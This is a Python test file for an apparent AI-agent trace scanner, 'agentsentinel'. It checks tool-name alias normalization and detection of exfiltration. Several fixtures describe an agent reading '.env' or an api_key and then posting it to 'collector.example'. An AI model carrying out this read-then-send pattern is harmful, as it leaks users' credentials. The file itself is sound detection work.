"""Exact tool aliases and their use in the scanner and classifier."""

from copy import deepcopy

import pytest

import agentsentinel.trace as trace_module
from agentsentinel import Sentinel
from agentsentinel.classifier import train
from agentsentinel.corpus import CorpusRow
from agentsentinel.trace import normalize_trace


@pytest.mark.parametrize(
    ("name", "canonical"),
    [
        ("case_note", "ticket_comment"),
        ("case_read", "ticket_read"),
        ("database_lookup", "db_query"),
        ("db.query", "db_query"),
        ("email.send", "email_send"),
        ("file.delete", "file_delete"),
        ("file.read", "file_read"),
        ("file.write", "file_write"),
        ("http.post", "http_post"),
        ("list.dir", "list_dir"),
        ("list_directory", "list_directory"),
        ("open_document", "file_read"),
        ("read_file", "read_file"),
        ("save_document", "file_write"),
        ("terminal_run", "shell"),
        ("web_fetch", "http_get"),
        ("webhook_call", "http_post"),
        ("  Webhook_Call\t", "http_post"),
        ("http_post", "http_post"),
        ("webhook_callback", "webhook_callback"),
        ("webhook-call", "webhook-call"),
        ("vendor.webhook_call", "vendor.webhook_call"),
    ],
)
def test_tool_canonicalization_is_exact(name: str, canonical: str) -> None:
    (step,) = normalize_trace({"steps": [{"tool": name}]})
    assert step.tool == canonical


@pytest.mark.parametrize(
    ("tool", "family"),
    [("vendor.http.post", "http_post"), ("warehouse.db.query", "db_query")],
)
def test_namespaced_dotted_tools_keep_their_rule_family(tool: str, family: str) -> None:
    (step,) = normalize_trace({"steps": [{"tool": tool}]})

    assert step.tool == tool
    assert step.family_name == family


def test_scan_does_not_mutate_caller_trace() -> None:
    trace: dict[str, object] = {
        "trace_id": "test",
        "steps": [
            {
                "tool": " Database_Lookup ",
                "args": {"query": "SELECT setting FROM preferences"},
                "result": {"api_key": ["fixture-value"]},
            },
            {
                "tool": "webhook_call",
                "args": {"url": "https://collector.example/ingest"},
            },
        ],
    }
    original = deepcopy(trace)
    report = Sentinel().scan(trace)

    assert trace == original
    assert "exfil:read-then-send" in report.signals


def test_alias_normalization_tolerates_malformed_steps_and_cycles() -> None:
    args: dict[str, object] = {"path": ".env"}
    args["cycle"] = args
    trace: dict[str, object] = {
        "steps": [
            None,
            {"tool": ["webhook_call"]},
            {"tool": "  "},
            {"tool": "terminal_run", "args": []},
            {"tool": "open_document", "args": args},
            {"tool": "webhook_call", "args": {"url": "https://collector.example"}},
        ]
    }

    assert tuple(step.tool for step in normalize_trace(trace)) == (
        "file_read",
        "http_post",
    )
    assert Sentinel().scan(trace).flagged
    assert args["cycle"] is args


def test_training_uses_canonical_tool_unigrams_and_bigrams() -> None:
    aliased: dict[str, object] = {
        "steps": [{"tool": "open_document"}, {"tool": "webhook_call"}]
    }
    canonical: dict[str, object] = {
        "steps": [{"tool": "file_read"}, {"tool": "http_post"}]
    }
    model = train(
        (
            CorpusRow(aliased, "malicious", "exfiltration"),
            CorpusRow({"steps": [{"tool": "web_search"}]}, "benign", "benign"),
        )
    )

    assert {
        "tool:file_read",
        "tool:http_post",
        'bigram:["file_read","http_post"]',
    } <= set(model.vocabulary)
    assert model.predict_probability(normalize_trace(aliased)) == (
        model.predict_probability(normalize_trace(canonical))
    )


def test_scan_flags_renamed_tool_exfiltration(monkeypatch: pytest.MonkeyPatch) -> None:
    trace: dict[str, object] = {
        "steps": [
            {"tool": "open_document", "args": {"path": ".env"}},
            {
                "tool": "webhook_call",
                "args": {"url": "https://collector.example/ingest"},
            },
        ]
    }
    scanner = Sentinel()
    report = scanner.scan(trace)
    assert report.flagged
    assert report.categories == ("exfiltration",)
    assert "exfil:read-then-send" in report.signals

    monkeypatch.setattr(trace_module, "_CANONICAL_TOOL_NAMES", {})
    assert not scanner.scan(trace).flagged
